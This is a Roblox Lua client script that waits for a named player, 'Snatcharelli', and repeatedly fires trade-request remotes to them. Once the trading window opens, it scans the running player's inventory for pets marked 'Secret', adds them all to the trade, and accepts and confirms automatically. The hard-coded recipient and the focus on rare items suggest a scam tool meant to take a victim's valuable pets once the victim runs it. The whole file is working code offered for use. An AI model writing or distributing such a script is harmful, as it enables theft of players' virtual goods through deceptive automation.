local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- RemoteEvent path
local Event = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent

-- Config
local waitedPlayer = "Snatcharelli" -- Replace with the exact target name
local TRADE_INTERVAL = 5

-- Wait for the player to join (if not already in game)
local targetPlayer = Players:FindFirstChild(waitedPlayer)
if not targetPlayer then
	print("Waiting for " .. waitedPlayer .. " to join...")
	targetPlayer = Players:WaitForChild(waitedPlayer)
end
print("Player found: " .. targetPlayer.Name)

-- Trade Request Loop (runs on Heartbeat)
local lastFireTime = 0
RunService.Heartbeat:Connect(function(dt)
	if targetPlayer and targetPlayer.Parent == Players then
		lastFireTime += dt
		if lastFireTime >= TRADE_INTERVAL then
			Event:FireServer("TradeRequestAccept", targetPlayer)
			lastFireTime = 0
		end
	end
end)

-- Wait for the Trading UI to become visible and run mainCode
local function mainCode()
	local SecretPets = {}
	local scrollingFrame = playerGui:WaitForChild("ScreenGui")
		:WaitForChild("Trading"):WaitForChild("Frame")
		:WaitForChild("Inner"):WaitForChild("You")
		:WaitForChild("Holder"):WaitForChild("Pets")

	local canvasHeight = scrollingFrame.CanvasSize.Y.Offset
	local viewHeight = scrollingFrame.AbsoluteWindowSize.Y
	local scrollStep = 50

	for scrollY = 0, canvasHeight - viewHeight, scrollStep do
		scrollingFrame.CanvasPosition = Vector2.new(0, scrollY)
		task.wait(0.05)
		for _, child in ipairs(scrollingFrame:GetChildren()) do
			local inner = child:FindFirstChild("Inner")
			if inner and inner:IsA("Frame") then
				local button = inner:FindFirstChild("Button")
				if button and button:IsA("ImageButton") then
					local innerButton = button:FindFirstChild("Inner")
					local secretTag = innerButton and innerButton:FindFirstChild("Secret")
					if secretTag and secretTag:IsA("GuiObject") and secretTag.Visible then
						local petId = child.Name
						if not table.find(SecretPets, petId) then
							table.insert(SecretPets, petId)
						end
					end
				end
			end
		end
	end

	scrollingFrame.CanvasPosition = Vector2.new(0, canvasHeight)

	for i, petId in ipairs(SecretPets) do
		task.delay(i * 0.5, function()
			print("Adding to trade:", petId)
			Event:FireServer("TradeAddPet", petId)

			if i == #SecretPets then
				task.delay(0.7, function()
					print("Accepting trade")
					Event:FireServer("TradeAccept")
					task.wait(10)
					Event:FireServer("TradeConfirm")
				end)
			end
		end)
	end
end

task.spawn(function()
	local tradingFrame = playerGui:WaitForChild("ScreenGui")
		:WaitForChild("Trading"):WaitForChild("Frame")

	tradingFrame:GetPropertyChangedSignal("Visible"):Connect(function()
		if tradingFrame.Visible then
			print("Trading UI opened, running mainCode()")
			mainCode()
		end
	end)
end)
